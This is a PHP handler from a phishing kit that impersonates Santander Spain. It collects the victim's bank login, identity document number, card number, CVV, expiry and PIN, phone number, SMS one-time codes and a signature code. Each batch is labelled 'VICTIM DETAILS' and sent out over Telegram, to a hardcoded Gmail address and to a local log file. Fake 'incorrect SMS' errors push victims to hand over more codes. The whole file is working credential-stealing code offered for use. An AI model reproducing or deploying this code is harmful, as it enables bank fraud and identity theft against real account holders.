<?php

/**
 * @link              https://www.z0n51.com/
 * @since             20/02/2020
 * @package           SANTANDER ES
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      SANTANDER ES
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

include_once '../inc/app.php';
include_once '../vendor/autoload.php';
use Inacho\CreditCard;

function validate_cc_number($number = null) {
    $card = CreditCard::validCreditCard($number);
    if( $card['valid'] == false ) {
        return false;
    }
    return $card;
}

function validate_cc_cvv($number = null,$type = null) {
    if( empty($number) || empty($type) )
        return false;
    $cvv = CreditCard::validCvc($number, $type);
    return $cvv;
}

$to = 'dr.hkrzlt@gmail.com';

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if( !empty($_POST['verbot']) ) {
        header("HTTP/1.0 404 Not Found");
        die();
    }

    if ($_POST['type'] == "login") {

        $_SESSION['doc_type']    = $_POST['doc_type'];
        $_SESSION['doc_number']  = $_POST['doc_number'];
        $_SESSION['username']    = $_POST['username'];
        $_SESSION['password']    = $_POST['pass1'].$_POST['pass2'].$_POST['pass3'].$_POST['pass4'].$_POST['pass5'].$_POST['pass6'].$_POST['pass7'].$_POST['pass8'];

        $subject = $_SERVER['REMOTE_ADDR'] . ' | SANTANDER | Login';
        $message = '/-- LOG INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
        $message .= 'Documento : ' . $_POST['doc_type'] . "\r\n";
        $message .= 'Nº de documento : ' . $_POST['doc_number'] . "\r\n";
        $message .= 'Usuario : ' . $_POST['username'] . "\r\n";
        $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
        $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
        $message .= 'IP address : ' . get_user_ip() . "\r\n";
        $message .= 'Country : ' . get_user_country() . "\r\n";
        $message .= 'OS : ' . get_user_os() . "\r\n";
        $message .= 'Browser : ' . get_user_browser() . "\r\n";
        $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
        $message .= '/-- END LOG INFOS --/' . "\r\n\r\n";
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

        telegram_send(urlencode($message));
        mail($to,$subject,$message,$headers);
        file_put_contents("../resultt4402.txt", $message, FILE_APPEND);
        header("location: loading1.php?redirection#_$dispatch");

    }

    if ($_POST['type'] == "cc") {

        $_SESSION['cc_number']  = $_POST['cc_number'];
        $_SESSION['cc_cvv']     = $_POST['cc_cvv'];
        $_SESSION['cc_date']    = $_POST['cc_date'];
        $_SESSION['cc_pin']     = $_POST['cc_pin'];

        $date_ex = explode('/',$_POST['cc_date']);

        $card_number = validate_cc_number($_POST['cc_number']);
        $card_cvv    = validate_cc_cvv($_POST['cc_cvv'],$card_number['type']);

        if( count($date_ex) > 1 ) {
            $cc_date = trim($date_ex[0]) . '/' . trim($date_ex[1]);
        } else {
            $cc_date = false;
        }

        $_SESSION['errors'] = [];
        if( $card_number == false ) {
            $_SESSION['errors']['cc_number'] = 'Por favor, introduzca un número de tarjeta válido';
        }
        if( validate_date($cc_date,'m/y') == false ) {
            $_SESSION['errors']['cc_date'] = 'Por favor introduzca una fecha valida';
        }
        if( $card_cvv == false ) {
            $_SESSION['errors']['cc_cvv'] = 'Por favor ingrese un código válido';
        }
        if( validate_number($_POST['cc_pin'],4) == false ) {
            $_SESSION['errors']['cc_pin'] = 'Por favor ingrese un pin válido';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | SANTANDER | Card';
            $message = '/-- CARD INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Card number : ' . $_POST['cc_number'] . "\r\n";
            $message .= 'Card date : ' . $_POST['cc_date'] . "\r\n";
            $message .= 'Card cvv : ' . $_POST['cc_cvv'] . "\r\n";
            $message .= 'Card pin : ' . $_POST['cc_pin'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END CARD INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            telegram_send(urlencode($message));
            mail($to,$subject,$message,$headers);
            file_put_contents("../resultt4402.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: loading2.php?redirection#_$dispatch");

        } else {
            header("location: cc.php?error#_$dispatch");
        }

    }

    if ($_POST['type'] == "phone") {

        $_SESSION['phone']  = $_POST['phone'];

        $_SESSION['errors'] = [];
        if( validate_number($_POST['phone']) == false ) {
            $_SESSION['errors']['phone'] = 'por favor ingrese un teléfono válido';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | SANTANDER | Phone';
            $message = '/-- PHONE INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Phone : ' . $_POST['phone'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END PHONE INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            telegram_send(urlencode($message));
            mail($to,$subject,$message,$headers);
            file_put_contents("../resultt4402.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: loading3.php?redirection#_$dispatch");

        } else {
            header("location: phone.php?error#_$dispatch");
        }

    }

    if ($_POST['type'] == "confirm_code") {

        $_SESSION['confirm_code'] = $_POST['confirm_code'];

        $_SESSION['errors'] = [];
        if( strlen($_POST['confirm_code']) !== 6 ) {
            $_SESSION['errors']['confirm_code'] = 'el último SMS que ha ingresado es incorrecto, por favor le enviaremos otro código de verificación para verificar su cuenta';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | SANTANDER | Sms 1';
            $message = '/-- SMS 1 CODE --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'SMS code : ' . $_POST['confirm_code'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END SMS 1 CODE --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $error = (!empty($_POST['error'])) ? $_POST['error'] : 1;
            telegram_send(urlencode($message));
            mail($to,$subject,$message,$headers);
            file_put_contents("../resultt4402.txt", $message, FILE_APPEND);
            if( $error >= 2 ) {
                header("location: loading4.php?redirection#_$dispatch");
            } else {
                $_SESSION['errors']['confirm_code'] = 'el último SMS que ha ingresado es incorrecto, por favor le enviaremos otro código de verificación para verificar su cuenta';
                $error = $error + 1;
                header("location: sms.php?error=". $error ."&#_$dispatch");
            }
        } else {
            $_SESSION['errors']['confirm_code'] = 'el último SMS que ha ingresado es incorrecto, por favor le enviaremos otro código de verificación para verificar su cuenta';
            $error = (!empty($_POST['error'])) ? $_POST['error'] : 1;
            header("location: sms.php?error=". $error ."&#_$dispatch");
        }

    }

    if ($_POST['type'] == "firma") {

        $_SESSION['firma']    = $_POST['firma1'].$_POST['firma2'].$_POST['firma3'].$_POST['firma4'].$_POST['firma5'].$_POST['firma6'].$_POST['firma7'].$_POST['firma8'];

        $subject = $_SERVER['REMOTE_ADDR'] . ' | SANTANDER | Firma 1';
        $message = '/-- FIRMA 1 INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
        $message .= 'Firma : ' . $_SESSION['firma'] . "\r\n";
        $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
        $message .= 'IP address : ' . get_user_ip() . "\r\n";
        $message .= 'Country : ' . get_user_country() . "\r\n";
        $message .= 'OS : ' . get_user_os() . "\r\n";
        $message .= 'Browser : ' . get_user_browser() . "\r\n";
        $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
        $message .= '/-- END FIRMA 1 INFOS --/' . "\r\n\r\n";
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

        telegram_send(urlencode($message));
        mail($to,$subject,$message,$headers);
        file_put_contents("../resultt4402.txt", $message, FILE_APPEND);
        $_SESSION['errors']['confirm_code2'] = 'el último SMS que ha ingresado es incorrecto, por favor le enviaremos otro código de verificación para verificar su cuenta';
        header("location: loading5.php?redirection#_$dispatch");

    }

    if ($_POST['type'] == "confirm_code2") {

        $_SESSION['confirm_code2'] = $_POST['confirm_code2'];

        $_SESSION['errors'] = [];
        if( strlen($_POST['confirm_code2']) !== 6 ) {
            $_SESSION['errors']['confirm_code2'] = 'el último SMS que ha ingresado es incorrecto, por favor le enviaremos otro código de verificación para verificar su cuenta';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | SANTANDER | Sms 2';
            $message = '/-- SMS 2 CODE --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'SMS code : ' . $_POST['confirm_code2'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END SMS 2 CODE --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            $error = (!empty($_POST['error'])) ? $_POST['error'] : 1;
            telegram_send(urlencode($message));
            mail($to,$subject,$message,$headers);
            file_put_contents("../resultt4402.txt", $message, FILE_APPEND);
            if( $error == 2 ) {
                header("location: loading6.php?redirection#_$dispatch");
            } else {
                $_SESSION['errors']['confirm_code2'] = 'el último SMS que ha ingresado es incorrecto, por favor le enviaremos otro código de verificación para verificar su cuenta';
                $error = $error + 1;
                header("location: sms2.php?error=". $error ."&#_$dispatch");
            }
        } else {
            $_SESSION['errors']['confirm_code2'] = 'el último SMS que ha ingresado es incorrecto, por favor le enviaremos otro código de verificación para verificar su cuenta';
            $error = (!empty($_POST['error'])) ? $_POST['error'] : 1;
            header("location: sms2.php?error=". $error ."&#_$dispatch");
        }

    }

}

?>